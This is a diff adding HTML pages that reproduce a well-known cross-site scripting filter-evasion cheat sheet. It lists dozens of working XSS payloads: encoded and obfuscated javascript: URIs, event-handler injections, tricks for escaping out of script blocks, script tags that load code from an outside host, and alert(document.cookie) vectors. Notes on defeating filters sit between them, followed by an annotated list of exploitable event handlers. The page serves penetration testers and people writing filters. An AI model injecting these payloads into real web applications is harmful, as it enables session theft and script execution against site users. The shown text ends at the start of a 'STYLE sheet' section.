+            <h2><span class="mw-headline" id="XSS_Locator">XSS Locator</span></h2>
+            <p>Inject this string, and in most cases where a script is vulnerable with no special XSS vector
+                requirements the word "XSS" will pop up. Use this <a rel="nofollow" class="external text"
+                                                                     href="http://ha.ckers.org/xsscalc.html">URL
+                    encoding calculator</a> to encode the entire string. Tip: if you're in a rush and need to quickly
+                check a page, often times injecting the depreciated "&lt;PLAINTEXT&gt;" tag will be enough to check to
+                see if something is vulnerable to XSS by messing up the output appreciably:
+            </p>
+<pre>';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//&quot;;
+alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//--
+&gt;&lt;/SCRIPT&gt;&quot;&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
+</pre>
+            <h2><span class="mw-headline" id="XSS_Locator_.28short.29">XSS Locator (short)</span></h2>
+            <p>If you don't have much space and know there is no vulnerable JavaScript on the page, this string is a
+                nice compact XSS injection check. View source after injecting it and look for &lt;XSS verses &amp;lt;XSS
+                to see if it is vulnerable:
+            </p>
+<pre>&#39;&#39;;!--"&lt;XSS&gt;=&amp;{()}
+</pre>
+            <h2><span class="mw-headline" id="No_Filter_Evasion">No Filter Evasion</span></h2>
+            <p>This is a normal XSS JavaScript injection, and most likely to get caught but I suggest trying it first
+                (the quotes are not required in any modern browser so they are omitted here):
+            </p>
+<pre>&lt;SCRIPT SRC=http:&#47;&#47;xss.rocks&#47;xss.js&gt;&lt;/SCRIPT&gt;
+</pre>
+            <p><br/>
+            </p>
+            <h2><span class="mw-headline" id="Filter_bypass_based_polyglot">Filter bypass based polyglot</span></h2>
+ <pre>'"&gt;&gt;&lt;marquee&gt;&lt;img src=x onerror=confirm(1)&gt;&lt;/marquee&gt;"&gt;&lt;/plaintext\&gt;&lt;/|\&gt;&lt;plaintext/onmouseover=prompt(1)&gt;
+&lt;script&gt;prompt(1)&lt;/script&gt;@gmail.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;'--&gt;"&gt;&lt;/script&gt;
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;"&gt;
+&lt;img/id="confirm&amp;lpar;1&#x29;"/alt="/"src="/"onerror=eval(id&#x29;&gt;'"&gt;
+&lt;img src="http://www.shellypalmer.com/wp-content/images/2015/07/hacked-compressor.jpg"&gt;</pre>
+            <h2><span class="mw-headline" id="Image_XSS_using_the_JavaScript_directive">Image XSS using the JavaScript directive</span>
+            </h2>
+            <p>Image XSS using the JavaScript directive (IE7.0 doesn't support the JavaScript directive in context of an
+                image, but it does in other contexts, but the following show the principles that would work in other
+                tags as well:
+            </p>
+<pre>&lt;IMG SRC="javascript:alert('XSS');"&gt;
+</pre>
+            <h2><span class="mw-headline" id="No_quotes_and_no_semicolon">No quotes and no semicolon</span></h2>
+<pre>&lt;IMG SRC=javascript:alert('XSS')&gt;
+</pre>
+            <h2><span class="mw-headline"
+                      id="Case_insensitive_XSS_attack_vector">Case insensitive XSS attack vector</span></h2>
+<pre>&lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt;
+</pre>
+            <h2><span class="mw-headline" id="HTML_entities">HTML entities</span></h2>
+            <p>The semicolons are required for this to work:
+            </p>
+<pre>&lt;IMG SRC=javascript:alert(&quot;XSS&quot;)&gt;
+</pre>
+            <h2><span class="mw-headline" id="Grave_accent_obfuscation">Grave accent obfuscation</span></h2>
+            <p>If you need to use both double and single quotes you can use a grave accent to encapsulate the JavaScript
+                string - this is also useful because lots of cross site scripting filters don't know about grave
+                accents:
+            </p>
+<pre>&lt;IMG SRC=`javascript:alert("RSnake says, 'XSS'")`&gt;
+</pre>
+            <h2><span class="mw-headline" id="Malformed_A_tags">Malformed A tags</span></h2>
+            <p>Skip the HREF attribute and get to the meat of the XXS...
+                Submitted by David Cross ~ Verified on Chrome
+            </p>
+            <p>&lt;a onmouseover="alert(document.cookie)"&gt;xxs link&lt;/a&gt;
+            </p>
+            <p>or
+                Chrome loves to replace missing quotes for you... if you ever get stuck just leave them off and Chrome
+                will put them in the right place and fix your missing quotes on a URL or script.
+            </p>
+            <p>&lt;a onmouseover=alert(document.cookie)&gt;xxs link&lt;/a&gt;
+            </p>
+            <h2><span class="mw-headline" id="Malformed_IMG_tags">Malformed IMG tags</span></h2>
+            <p>Originally found by Begeek (but cleaned up and shortened to work in all browsers), this XSS vector uses
+                the relaxed rendering engine to create our XSS vector within an IMG tag that should be encapsulated
+                within quotes. I assume this was originally meant to correct sloppy coding. This would make it
+                significantly more difficult to correctly parse apart an HTML tag:
+            </p>
+<pre>&lt;IMG """&gt;&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;"&gt;
+</pre>
+            <h2><span class="mw-headline" id="fromCharCode">fromCharCode</span></h2>
+            <p>If no quotes of any kind are allowed you can eval() a fromCharCode in JavaScript to create any XSS vector
+                you need:
+            </p>
+<pre>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;
+</pre>
+            <h2><span class="mw-headline" id="Default_SRC_tag_to_get_past_filters_that_check_SRC_domain">Default SRC tag to get past filters that check SRC domain</span>
+            </h2>
+            <p>This will bypass most SRC domain filters. Inserting javascript in an event method will also apply to any
+                HTML tag type injection that uses elements like Form, Iframe, Input, Embed etc. It will also allow any
+                relevant event for the tag type to be substituted like onblur, onclick giving you an extensive amount of
+                variations for many injections listed here.
+                Submitted by David Cross .
+            </p>
+            <p>Edited by Abdullah Hussam(@Abdulahhusam).
+            </p>
+<pre>&lt;IMG SRC=# onmouseover="alert('xxs')"&gt;
+</pre>
+            <h2><span class="mw-headline"
+                      id="Default_SRC_tag_by_leaving_it_empty">Default SRC tag by leaving it empty</span></h2>
+<pre>&lt;IMG SRC= onmouseover="alert('xxs')"&gt;
+</pre>
+            <h2><span class="mw-headline" id="Default_SRC_tag_by_leaving_it_out_entirely">Default SRC tag by leaving it out entirely</span>
+            </h2>
+<pre>&lt;IMG onmouseover="alert('xxs')"&gt;
+</pre>
+            <h2><span class="mw-headline" id="On_error_alert">On error alert</span></h2>
+<pre>&lt;IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"&gt;&lt;/img&gt;
+</pre>
+            <h2><span class="mw-headline" id="IMG_onerror_and_javascript_alert_encode">IMG  onerror and javascript alert encode</span>
+            </h2>
+<pre>&lt;img src=x onerror="&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041"&gt;
+</pre>
+            <h2><span class="mw-headline"
+                      id="Decimal_HTML_character_references">Decimal HTML character references</span></h2>
+            <p>all of the XSS examples that use a javascript: directive inside of an &lt;IMG tag will not work in
+                Firefox or Netscape 8.1+ in the Gecko rendering engine mode).
+            </p>
+<pre>&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;
+&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
+</pre>
+            <h2><span class="mw-headline" id="Decimal_HTML_character_references_without_trailing_semicolons">Decimal HTML character references without trailing semicolons</span>
+            </h2>
+            <p>This is often effective in XSS that attempts to look for "&amp;#XX;", since most people don't know about
+                padding - up to 7 numeric characters total. This is also useful against people who decode against
+                strings like $tmp_string =~ s/.*\&amp;#(\d+);.*/$1/; which incorrectly assumes a semicolon is required
+                to terminate a html encoded string (I've seen this in the wild):
+            </p>
+<pre>&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;
+#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;
+</pre>
+            <h2><span class="mw-headline" id="Hexadecimal_HTML_character_references_without_trailing_semicolons">Hexadecimal HTML character references without trailing semicolons</span>
+            </h2>
+            <p>This is also a viable XSS attack against the above string $tmp_string =~ s/.*\&amp;#(\d+);.*/$1/; which
+                assumes that there is a numeric character following the pound symbol - which is not true with hex HTML
+                characters).
+            </p>
+<pre>&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;
+</pre>
+            <h2><span class="mw-headline" id="Embedded_tab">Embedded tab</span></h2>
+            <p>Used to break up the cross site scripting attack:
+            </p>
+<pre>&lt;IMG SRC="jav&#x9;ascript:alert('XSS');"&gt;
+</pre>
+            <h2><span class="mw-headline" id="Embedded_Encoded_tab">Embedded Encoded tab</span></h2>
+            <p>Use this one to break up XSS&#160;:
+            </p>
+<pre>&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"&gt;
+</pre>
+            <h2><span class="mw-headline" id="Embedded_newline_to_break_up_XSS">Embedded newline to break up XSS</span>
+            </h2>
+            <p>Some websites claim that any of the chars 09-13 (decimal) will work for this attack. That is incorrect.
+                Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work. See the ascii chart for more
+                details. The following four XSS examples illustrate this vector:
+            </p>
+<pre>&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"&gt;
+</pre>
+            <h2><span class="mw-headline" id="Embedded_carriage_return_to_break_up_XSS">Embedded carriage return to break up XSS</span>
+            </h2>
+            <p>(Note: with the above I am making these strings longer than they have to be because the zeros could be
+                omitted. Often I've seen filters that assume the hex and dec encoding has to be two or three characters.
+                The real rule is 1-7 characters.):
+            </p>
+<pre>&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"&gt;
+</pre>
+            <h2><span class="mw-headline"
+                      id="Null_breaks_up_JavaScript_directive">Null breaks up JavaScript directive</span></h2>
+            <p>Null chars also work as XSS vectors but not like above, you need to inject them directly using something
+                like Burp Proxy or use&#160;%00 in the URL string or if you want to write your own injection tool you
+                can either use vim (^V^@ will produce a null) or the following program to generate it into a text file.
+                Okay, I lied again, older versions of Opera (circa 7.11 on Windows) were vulnerable to one additional
+                char 173 (the soft hypen control char). But the null char&#160;%00is much more useful and helped me
+                bypass certain real world filters with a variation on this example:
+            </p>
+<pre>perl -e 'print "&lt;IMG SRC=java\0script:alert(\"XSS\")&gt;";' &gt; out
+</pre>
+            <h2><span class="mw-headline" id="Spaces_and_meta_chars_before_the_JavaScript_in_images_for_XSS">Spaces and meta chars before the JavaScript in images for XSS</span>
+            </h2>
+            <p>This is useful if the pattern match doesn't take into account spaces in the word "javascript:" -which is
+                correct since that won't render- and makes the false assumption that you can't have a space between the
+                quote and the "javascript:" keyword. The actual reality is you can have any char from 1-32 in decimal:
+            </p>
+<pre>&lt;IMG SRC=" &amp;#14;  javascript:alert('XSS');"&gt;
+</pre>
+            <h2><span class="mw-headline" id="Non-alpha-non-digit_XSS">Non-alpha-non-digit XSS</span></h2>
+            <p>The Firefox HTML parser assumes a non-alpha-non-digit is not valid after an HTML keyword and therefor
+                considers it to be a whitespace or non-valid token after an HTML tag. The problem is that some XSS
+                filters assume that the tag they are looking for is broken up by whitespace.
+                For example "&lt;SCRIPT\s"&#160;!= "&lt;SCRIPT/XSS\s":
+            </p>
+<pre>&lt;SCRIPT/XSS SRC="http:&#47;&#47;xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;
+</pre>
+            <p>Based on the same idea as above, however,expanded on it, using Rnake fuzzer. The Gecko rendering engine
+                allows for any character other than letters, numbers or encapsulation chars (like quotes, angle
+                brackets, etc...) between the event handler and the equals sign, making it easier to bypass cross site
+                scripting blocks. Note that this also applies to the grave accent char as seen here:
+            </p>
+<pre>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")&gt;
+</pre>
+            <p>Yair Amit brought this to my attention that there is slightly different behavior between the IE and Gecko
+                rendering engines that allows just a slash between the tag and the parameter with no spaces. This could
+                be useful if the system does not allow spaces.
+            </p>
+<pre>&lt;SCRIPT/SRC="http:&#47;&#47;xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;
+</pre>
+            <h2><span class="mw-headline" id="Extraneous_open_brackets">Extraneous open brackets</span></h2>
+            <p>Submitted by Franz Sedlmaier, this XSS vector could defeat certain detection engines that work by first
+                using matching pairs of open and close angle brackets and then by doing a comparison of the tag inside,
+                instead of a more efficient algorythm like Boyer-Moore that looks for entire string matches of the open
+                angle bracket and associated tag (post de-obfuscation, of course). The double slash comments out the
+                ending extraneous bracket to supress a JavaScript error:
+            </p>
+<pre>&lt;&lt;SCRIPT&gt;alert("XSS");//&lt;&lt;/SCRIPT&gt;
+</pre>
+            <h2><span class="mw-headline" id="No_closing_script_tags">No closing script tags</span></h2>
+            <p>In Firefox and Netscape 8.1 in the Gecko rendering engine mode you don't actually need the "&gt;&lt;/SCRIPT&gt;"
+                portion of this Cross Site Scripting vector. Firefox assumes it's safe to close the HTML tag and add
+                closing tags for you. How thoughtful! Unlike the next one, which doesn't effect Firefox, this does not
+                require any additional HTML below it. You can add quotes if you need to, but they're not needed
+                generally, although beware, I have no idea what the HTML will end up looking like once this is injected:
+            </p>
+<pre>&lt;SCRIPT SRC=http://xss.rocks/xss.js?&lt; B &gt;
+</pre>
+            <h2><span class="mw-headline"
+                      id="Protocol_resolution_in_script_tags">Protocol resolution in script tags</span></h2>
+            <p>This particular variant was submitted by Łukasz Pilorz and was based partially off of Ozh's protocol
+                resolution bypass below. This cross site scripting example works in IE, Netscape in IE rendering mode
+                and Opera if you add in a &lt;/SCRIPT&gt; tag at the end. However, this is especially useful where space
+                is an issue, and of course, the shorter your domain, the better. The ".j" is valid, regardless of the
+                encoding type because the browser knows it in context of a SCRIPT tag.
+            </p>
+<pre>&lt;SCRIPT SRC=//xss.rocks/.j&gt;
+</pre>
+            <h2><span class="mw-headline" id="Half_open_HTML.2FJavaScript_XSS_vector">Half open HTML/JavaScript XSS vector</span>
+            </h2>
+            <p>Unlike Firefox the IE rendering engine doesn't add extra data to your page, but it does allow the
+                javascript: directive in images. This is useful as a vector because it doesn't require a close angle
+                bracket. This assumes there is any HTML tag below where you are injecting this cross site scripting
+                vector. Even though there is no close "&gt;" tag the tags below it will close it. A note: this does mess
+                up the HTML, depending on what HTML is beneath it. It gets around the following NIDS regex:
+                /((\%3D)|(=))[^\n]*((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/ because it doesn't require the end "&gt;". As a
+                side note, this was also affective against a real world XSS filter I came across using an open ended
+                &lt;IFRAME tag instead of an &lt;IMG tag:
+            </p>
+<pre>&lt;IMG SRC="javascript:alert('XSS')"
+</pre>
+            <h2><span class="mw-headline" id="Double_open_angle_brackets">Double open angle brackets</span></h2>
+            <p>Using an open angle bracket at the end of the vector instead of a close angle bracket causes different
+                behavior in Netscape Gecko rendering. Without it, Firefox will work but Netscape won't:
+            </p>
+<pre>&lt;iframe src=http://xss.rocks/scriptlet.html &lt;
+</pre>
+            <h2><span class="mw-headline" id="Escaping_JavaScript_escapes">Escaping JavaScript escapes</span></h2>
+            <p>When the application is written to output some user information inside of a JavaScript like the
+                following: &lt;SCRIPT&gt;var a="$ENV{QUERY_STRING}";&lt;/SCRIPT&gt; and you want to inject your own
+                JavaScript into it but the server side application escapes certain quotes you can circumvent that by
+                escaping their escape character. When this gets injected it will read &lt;SCRIPT&gt;var
+                a="\\";alert('XSS');//";&lt;/SCRIPT&gt; which ends up un-escaping the double quote and causing the Cross
+                Site Scripting vector to fire. The XSS locator uses this method.:
+            </p>
+<pre>\";alert('XSS');//
+</pre>
+            <p>An alternative, if correct JSON or Javascript escaping has been applied to the embedded data but not HTML
+                encoding, is to finish the script block and start your own:
+            </p>
+<pre>&lt;/script&gt;&lt;script&gt;alert('XSS');&lt;/script&gt;
+</pre>
+            <h2><span class="mw-headline" id="End_title_tag">End title tag</span></h2>
+            <p>This is a simple XSS vector that closes &lt;TITLE&gt; tags, which can encapsulate the malicious cross
+                site scripting attack:
+            </p>
+<pre>&lt;/TITLE&gt;&lt;SCRIPT&gt;alert("XSS");&lt;/SCRIPT&gt;
+</pre>
+            <h2><span class="mw-headline" id="INPUT_image">INPUT image</span></h2>
+<pre>&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"&gt;
+</pre>
+            <h2><span class="mw-headline" id="BODY_image">BODY image</span></h2>
+<pre>&lt;BODY BACKGROUND="javascript:alert('XSS')"&gt;
+</pre>
+            <h2><span class="mw-headline" id="IMG_Dynsrc">IMG Dynsrc</span></h2>
+<pre>&lt;IMG DYNSRC="javascript:alert('XSS')"&gt;
+</pre>
+            <h2><span class="mw-headline" id="IMG_lowsrc">IMG lowsrc</span></h2>
+<pre>&lt;IMG LOWSRC="javascript:alert('XSS')"&gt;
+</pre>
+            <h2><span class="mw-headline" id="List-style-image">List-style-image</span></h2>
+            <p>Fairly esoteric issue dealing with embedding images for bulleted lists. This will only work in the IE
+                rendering engine because of the JavaScript directive. Not a particularly useful cross site scripting
+                vector:
+            </p>
+<pre>&lt;STYLE&gt;li {list-style-image: url("javascript:alert('XSS')");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt;
+</pre>
+            <h2><span class="mw-headline" id="VBscript_in_an_image">VBscript in an image</span></h2>
+<pre>&lt;IMG SRC='vbscript:msgbox("XSS")'&gt;
+</pre>
+            <h2><span class="mw-headline" id="Livescript_.28older_versions_of_Netscape_only.29">Livescript (older versions of Netscape only)</span>
+            </h2>
+<pre>&lt;IMG SRC="livescript:[code]"&gt;
+</pre>
+            <h2><span class="mw-headline" id="SVG_object_tag">SVG object tag</span></h2>
+<pre>&lt;svg/onload=alert('XSS')&gt;
+</pre>
+            <h2><span class="mw-headline" id="ECMAScript_6">ECMAScript 6</span></h2>
+<pre>Set.constructor`alert\x28document.domain\x29```
+</pre>
+            <h2><span class="mw-headline" id="BODY_tag">BODY tag</span></h2>
+            <p>Method doesn't require using any variants of "javascript:" or "&lt;SCRIPT..." to accomplish the XSS
+                attack). Dan Crowley additionally noted that you can put a space before the equals sign ("onload="&#160;!=
+                "onload ="):
+            </p>
+<pre>&lt;BODY ONLOAD=alert('XSS')&gt;
+</pre>
+            <h2><span class="mw-headline" id="Event_Handlers">Event Handlers</span></h2>
+            <p>It can be used in similar XSS attacks to the one above (this is the most comprehensive list on the net,
+                at the time of this writing). Thanks to Rene Ledosquet for the HTML+TIME updates.
+            </p>
+            <p>The <a rel="nofollow" class="external text" href="http://help.dottoro.com/">Dottoro Web Reference</a>
+                also has a nice <a rel="nofollow" class="external text" href="http://help.dottoro.com/ljfvvdnm.php">list
+                    of events in JavaScript</a>.
+            </p>
+            <ol>
+                <li><code>FSCommand()</code> (attacker can use this when executed from within an embedded Flash object)
+                </li>
+                <li><code>onAbort()</code> (when user aborts the loading of an image)
+                </li>
+                <li><code>onActivate()</code> (when object is set as the active element)
+                </li>
+                <li><code>onAfterPrint()</code> (activates after user prints or previews print job)
+                </li>
+                <li><code>onAfterUpdate()</code> (activates on data object after updating data in the source object)
+                </li>
+                <li><code>onBeforeActivate()</code> (fires before the object is set as the active element)
+                </li>
+                <li><code>onBeforeCopy()</code> (attacker executes the attack string right before a selection is copied
+                    to the clipboard - attackers can do this with the <code>execCommand("Copy")</code> function)
+                </li>
+                <li><code>onBeforeCut()</code> (attacker executes the attack string right before a selection is cut)
+                </li>
+                <li><code>onBeforeDeactivate()</code> (fires right after the activeElement is changed from the current
+                    object)
+                </li>
+                <li><code>onBeforeEditFocus()</code> (Fires before an object contained in an editable element enters a
+                    UI-activated state or when an editable container object is control selected)
+                </li>
+                <li><code>onBeforePaste()</code> (user needs to be tricked into pasting or be forced into it using the
+                    <code>execCommand("Paste")</code> function)
+                </li>
+                <li><code>onBeforePrint()</code> (user would need to be tricked into printing or attacker could use the
+                    <code>print()</code> or <code>execCommand("Print")</code> function).
+                </li>
+                <li><code>onBeforeUnload()</code> (user would need to be tricked into closing the browser - attacker
+                    cannot unload windows unless it was spawned from the parent)
+                </li>
+                <li><code>onBeforeUpdate()</code> (activates on data object before updating data in the source object)
+                </li>
+                <li><code>onBegin()</code> (the onbegin event fires immediately when the element's timeline begins)
+                </li>
+                <li><code>onBlur()</code> (in the case where another popup is loaded and window looses focus)
+                </li>
+                <li><code>onBounce()</code> (fires when the behavior property of the marquee object is set to
+                    "alternate" and the contents of the marquee reach one side of the window)
+                </li>
+                <li><code>onCellChange()</code> (fires when data changes in the data provider)
+                </li>
+                <li><code>onChange()</code> (select, text, or TEXTAREA field loses focus and its value has been
+                    modified)
+                </li>
+                <li><code>onClick()</code> (someone clicks on a form)
+                </li>
+                <li><code>onContextMenu()</code> (user would need to right click on attack area)
+                </li>
+                <li><code>onControlSelect()</code> (fires when the user is about to make a control selection of the
+                    object)
+                </li>
+                <li><code>onCopy()</code> (user needs to copy something or it can be exploited using the <code>execCommand("Copy")</code>
+                    command)
+                </li>
+                <li><code>onCut()</code> (user needs to copy something or it can be exploited using the <code>execCommand("Cut")</code>
+                    command)
+                </li>
+                <li><code>onDataAvailable()</code> (user would need to change data in an element, or attacker could
+                    perform the same function)
+                </li>
+                <li><code>onDataSetChanged()</code> (fires when the data set exposed by a data source object changes)
+                </li>
+                <li><code>onDataSetComplete()</code> (fires to indicate that all data is available from the data source
+                    object)
+                </li>
+                <li><code>onDblClick()</code> (user double-clicks a form element or a link)
+                </li>
+                <li><code>onDeactivate()</code> (fires when the activeElement is changed from the current object to
+                    another object in the parent document)
+                </li>
+                <li><code>onDrag()</code> (requires that the user drags an object)
+                </li>
+                <li><code>onDragEnd()</code> (requires that the user drags an object)
+                </li>
+                <li><code>onDragLeave()</code> (requires that the user drags an object off a valid location)
+                </li>
+                <li><code>onDragEnter()</code> (requires that the user drags an object into a valid location)
+                </li>
+                <li><code>onDragOver()</code> (requires that the user drags an object into a valid location)
+                </li>
+                <li><code>onDragDrop()</code> (user drops an object (e.g. file) onto the browser window)
+                </li>
+                <li><code>onDragStart()</code> (occurs when user starts drag operation)
+                </li>
+                <li><code>onDrop()</code> (user drops an object (e.g. file) onto the browser window)
+                </li>
+                <li><code>onEnd()</code> (the onEnd event fires when the timeline ends.
+                </li>
+                <li><code>onError()</code> (loading of a document or image causes an error)
+                </li>
+                <li><code>onErrorUpdate()</code> (fires on a databound object when an error occurs while updating the
+                    associated data in the data source object)
+                </li>
+                <li><code>onFilterChange()</code> (fires when a visual filter completes state change)
+                </li>
+                <li><code>onFinish()</code> (attacker can create the exploit when marquee is finished looping)
+                </li>
+                <li><code>onFocus()</code> (attacker executes the attack string when the window gets focus)
+                </li>
+                <li><code>onFocusIn()</code> (attacker executes the attack string when window gets focus)
+                </li>
+                <li><code>onFocusOut()</code> (attacker executes the attack string when window looses focus)
+                </li>
+                <li><code>onHashChange()</code> (fires when the fragment identifier part of the document's current
+                    address changed)
+                </li>
+                <li><code>onHelp()</code> (attacker executes the attack string when users hits F1 while the window is in
+                    focus)
+                </li>
+                <li><code>onInput()</code> (the text content of an element is changed through the user interface)
+                </li>
+                <li><code>onKeyDown()</code> (user depresses a key)
+                </li>
+                <li><code>onKeyPress()</code> (user presses or holds down a key)
+                </li>
+                <li><code>onKeyUp()</code> (user releases a key)
+                </li>
+                <li><code>onLayoutComplete()</code> (user would have to print or print preview)
+                </li>
+                <li><code>onLoad()</code> (attacker executes the attack string after the window loads)
+                </li>
+                <li><code>onLoseCapture()</code> (can be exploited by the <code>releaseCapture()</code> method)
+                </li>
+                <li><code>onMediaComplete()</code> (When a streaming media file is used, this event could fire before
+                    the file starts playing)
+                </li>
+                <li><code>onMediaError()</code> (User opens a page in the browser that contains a media file, and the
+                    event fires when there is a problem)
+                </li>
+                <li><code>onMessage()</code> (fire when the document received a message)
+                </li>
+                <li><code>onMouseDown()</code> (the attacker would need to get the user to click on an image)
+                </li>
+                <li><code>onMouseEnter()</code> (cursor moves over an object or area)
+                </li>
+                <li><code>onMouseLeave()</code> (the attacker would need to get the user to mouse over an image or table
+                    and then off again)
+                </li>
+                <li><code>onMouseMove()</code> (the attacker would need to get the user to mouse over an image or table)
+                </li>
+                <li><code>onMouseOut()</code> (the attacker would need to get the user to mouse over an image or table
+                    and then off again)
+                </li>
+                <li><code>onMouseOver()</code> (cursor moves over an object or area)
+                </li>
+                <li><code>onMouseUp()</code> (the attacker would need to get the user to click on an image)
+                </li>
+                <li><code>onMouseWheel()</code> (the attacker would need to get the user to use their mouse wheel)
+                </li>
+                <li><code>onMove()</code> (user or attacker would move the page)
+                </li>
+                <li><code>onMoveEnd()</code> (user or attacker would move the page)
+                </li>
+                <li><code>onMoveStart()</code> (user or attacker would move the page)
+                </li>
+                <li><code>onOffline()</code> (occurs if the browser is working in online mode and it starts to work
+                    offline)
+                </li>
+                <li><code>onOnline()</code> (occurs if the browser is working in offline mode and it starts to work
+                    online)
+                </li>
+                <li><code>onOutOfSync()</code> (interrupt the element's ability to play its media as defined by the
+                    timeline)
+                </li>
+                <li><code>onPaste()</code> (user would need to paste or attacker could use the <code>execCommand("Paste")</code>
+                    function)
+                </li>
+                <li><code>onPause()</code> (the onpause event fires on every element that is active when the timeline
+                    pauses, including the body element)
+                </li>
+                <li><code>onPopState()</code> (fires when user navigated the session history)
+                </li>
+                <li><code>onProgress()</code> (attacker would use this as a flash movie was loading)
+                </li>
+                <li><code>onPropertyChange()</code> (user or attacker would need to change an element property)
+                </li>
+                <li><code>onReadyStateChange()</code> (user or attacker would need to change an element property)
+                </li>
+                <li><code>onRedo()</code> (user went forward in undo transaction history)
+                </li>
+                <li><code>onRepeat()</code> (the event fires once for each repetition of the timeline, excluding the
+                    first full cycle)
+                </li>
+                <li><code>onReset()</code> (user or attacker resets a form)
+                </li>
+                <li><code>onResize()</code> (user would resize the window; attacker could auto initialize with something
+                    like: <code>&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;</code>)
+                </li>
+                <li><code>onResizeEnd()</code> (user would resize the window; attacker could auto initialize with
+                    something like: <code>&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;</code>)
+                </li>
+                <li><code>onResizeStart()</code> (user would resize the window; attacker could auto initialize with
+                    something like: <code>&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;</code>)
+                </li>
+                <li><code>onResume()</code> (the onresume event fires on every element that becomes active when the
+                    timeline resumes, including the body element)
+                </li>
+                <li><code>onReverse()</code> (if the element has a repeatCount greater than one, this event fires every
+                    time the timeline begins to play backward)
+                </li>
+                <li><code>onRowsEnter()</code> (user or attacker would need to change a row in a data source)
+                </li>
+                <li><code>onRowExit()</code> (user or attacker would need to change a row in a data source)
+                </li>
+                <li><code>onRowDelete()</code> (user or attacker would need to delete a row in a data source)
+                </li>
+                <li><code>onRowInserted()</code> (user or attacker would need to insert a row in a data source)
+                </li>
+                <li><code>onScroll()</code> (user would need to scroll, or attacker could use the
+                    <code>scrollBy()</code> function)
+                </li>
+                <li><code>onSeek()</code> (the onreverse event fires when the timeline is set to play in any direction
+                    other than forward)
+                </li>
+                <li><code>onSelect()</code> (user needs to select some text - attacker could auto initialize with
+                    something like: <code>window.document.execCommand("SelectAll");</code>)
+                </li>
+                <li><code>onSelectionChange()</code> (user needs to select some text - attacker could auto initialize
+                    with something like: <code>window.document.execCommand("SelectAll");</code>)
+                </li>
+                <li><code>onSelectStart()</code> (user needs to select some text - attacker could auto initialize with
+                    something like: <code>window.document.execCommand("SelectAll");</code>)
+                </li>
+                <li><code>onStart()</code> (fires at the beginning of each marquee loop)
+                </li>
+                <li><code>onStop()</code> (user would need to press the stop button or leave the webpage)
+                </li>
+                <li><code>onStorage()</code> (storage area changed)
+                </li>
+                <li><code>onSyncRestored()</code> (user interrupts the element's ability to play its media as defined by
+                    the timeline to fire)
+                </li>
+                <li><code>onSubmit()</code> (requires attacker or user submits a form)
+                </li>
+                <li><code>onTimeError()</code> (user or attacker sets a time property, such as dur, to an invalid value)
+                </li>
+                <li><code>onTrackChange()</code> (user or attacker changes track in a playList)
+                </li>
+                <li><code>onUndo()</code> (user went backward in undo transaction history)
+                </li>
+                <li><code>onUnload()</code> (as the user clicks any link or presses the back button or attacker forces a
+                    click)
+                </li>
+                <li><code>onURLFlip()</code> (this event fires when an Advanced Streaming Format (ASF) file, played by a
+                    HTML+TIME (Timed Interactive Multimedia Extensions) media tag, processes script commands embedded in
+                    the ASF file)
+                </li>
+                <li><code>seekSegmentTime()</code> (this is a method that locates the specified point on the element's
+                    segment time line and begins playing from that point. The segment consists of one repetition of the
+                    time line including reverse play using the AUTOREVERSE attribute.)
+                </li>
+            </ol>
+            <h2><span class="mw-headline" id="BGSOUND">BGSOUND</span></h2>
+<pre>&lt;BGSOUND SRC="javascript:alert('XSS');"&gt;
+</pre>
+            <h2><span class="mw-headline" id=".26_JavaScript_includes">&amp; JavaScript includes</span></h2>
+<pre>&lt;BR SIZE="&amp;{alert('XSS')}"&gt;
+</pre>
+            <h2><span class="mw-headline" id="STYLE_sheet">STYLE sheet</span></h2>
